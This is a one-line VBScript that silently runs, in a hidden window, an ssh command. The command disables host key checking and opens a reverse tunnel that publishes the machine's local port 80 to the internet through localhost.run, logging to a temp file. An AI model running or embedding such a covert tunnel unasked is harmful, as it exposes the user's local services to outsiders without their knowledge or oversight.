CreateObject("WScript.Shell").Run "cmd /c ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 80:127.0.0.1:80 nokey@localhost.run > %TEMP%\lhr.log 2>&1", 0, False
